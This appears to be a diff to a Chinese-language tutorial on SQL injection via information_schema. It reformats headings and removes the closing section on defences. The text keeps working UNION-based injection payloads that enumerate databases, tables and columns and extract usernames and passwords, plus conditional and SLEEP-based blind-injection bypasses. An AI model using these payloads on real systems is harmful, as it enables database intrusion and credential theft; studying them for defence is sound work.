@@ -35,26 +35,6 @@
 
 ------
 
-### **逻辑流程简图**
-
-```
-注入点发现
-      ↓
-获取数据库名称
-      ↓
-定位目标数据库
-      ↓
-列出表名
-      ↓
-定位目标表
-      ↓
-列出列名
-      ↓
-提取敏感数据
-```
-
-------
-
 ### **核心操作**
 
 - **`schemata`**：查看数据库列表
@@ -71,17 +51,11 @@
 
 ## **1. 获取数据库列表**
 
-### 目标：
-
-列出目标服务器上的所有数据库。
-
-### 查询：
+目标：列出目标服务器上的所有数据库。
 
 ```sql
 SELECT schema_name FROM information_schema.schemata;
 ```
-
-### SQL 注入示例：
 
 假设注入点是 `username` 参数，攻击者可能构造如下注入：
 
@@ -93,17 +67,11 @@ SELECT schema_name FROM information_schema.schemata;
 
 ## **2. 获取某个数据库中的所有表**
 
-### 目标：
-
-枚举目标数据库的所有表。
-
-### 查询：
+目标：枚举目标数据库的所有表。
 
 ```sql
 SELECT table_name FROM information_schema.tables WHERE table_schema = 'target_database';
 ```
-
-### SQL 注入示例：
 
 攻击者可以通过注入如下语句，爆破目标数据库的表名：
 
@@ -117,17 +85,11 @@ SELECT table_name FROM information_schema.tables WHERE table_schema = 'target_da
 
 ## **3. 获取某个表的列信息**
 
-### 目标：
-
-枚举目标表的列名，用于后续的敏感数据提取。
-
-### 查询：
+目标：枚举目标表的列名，用于后续的敏感数据提取。
 
 ```sql
 SELECT column_name FROM information_schema.columns WHERE table_name = 'target_table';
 ```
-
-### SQL 注入示例：
 
 攻击者可能构造如下注入语句：
 
@@ -141,17 +103,13 @@ SELECT column_name FROM information_schema.columns WHERE table_name = 'target_ta
 
 ## **4. 获取列类型等其他信息**
 
-### 目标：
-
-了解目标列的类型、约束等详细信息，为后续攻击（如类型转换或 Bypass）做准备。
-
-### 查询：
+目标：了解目标列的类型、约束等详细信息，为后续攻击（如类型转换或 Bypass）做准备。
 
 ```sql
 SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'target_table';
 ```
 
-### SQL 注入示例：
+SQL 注入示例：
 
 ```sql
 ' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'target_table' -- 
@@ -161,17 +119,13 @@ SELECT column_name, data_type FROM information_schema.columns WHERE table_name =
 
 ## **5. 获取表和列的组合信息**
 
-### 目标：
-
-列出所有数据库、表和列信息的组合，全面分析目标系统。
-
-### 查询：
+目标：列出所有数据库、表和列信息的组合，全面分析目标系统。
 
 ```sql
 SELECT table_schema, table_name, column_name FROM information_schema.columns;
 ```
 
-### SQL 注入示例：
+SQL 注入示例：
 
 ```sql
 ' UNION SELECT table_schema, table_name, column_name FROM information_schema.columns -- 
@@ -203,8 +157,6 @@ SELECT table_schema, table_name, column_name FROM information_schema.columns;
 
 一旦攻击者知道了表和列的具体名称，就可以结合这些信息，提取敏感数据，例如用户表的用户名和密码。
 
-### 示例：
-
 ```sql
 SELECT username, password FROM target_database.users;
 ```
@@ -219,25 +171,23 @@ SQL 注入语句可能如下：
 
 ## **8. 绕过防护**
 
-- 条件过滤
+条件过滤： 使用条件语句避免抛出异常：
 
-  ： 使用条件语句避免抛出异常：
+```sql
+' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users' AND column_name LIKE 'a%' -- 
+```
 
-  ```sql
-  ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users' AND column_name LIKE 'a%' -- 
-  ```
+延时注入： 利用 
 
-- 延时注入： 利用 
+```sql
+SLEEP()
+```
 
-  ```sql
-  SLEEP()
-  ```
+ 等函数确认元数据是否存在：
 
-   等函数确认元数据是否存在：
-
-  ```sql
-  ' UNION SELECT IF(LENGTH(table_name) = 5, SLEEP(5), NULL) FROM information_schema.tables -- 
-  ```
+```sql
+' UNION SELECT IF(LENGTH(table_name) = 5, SLEEP(5), NULL) FROM information_schema.tables -- 
+```
 
 ------
 
@@ -249,9 +199,3 @@ SQL 注入语句可能如下：
 2. 获取目标数据库的表名；
 3. 获取目标表的列名；
 4. 提取敏感数据。
-
-防御这类攻击的关键是：
-
-- 使用参数化查询（如 Prepared Statements）；
-- 限制低权限用户对 `information_schema` 的访问；
-- 实现严格的输入验证和 WAF 防护。
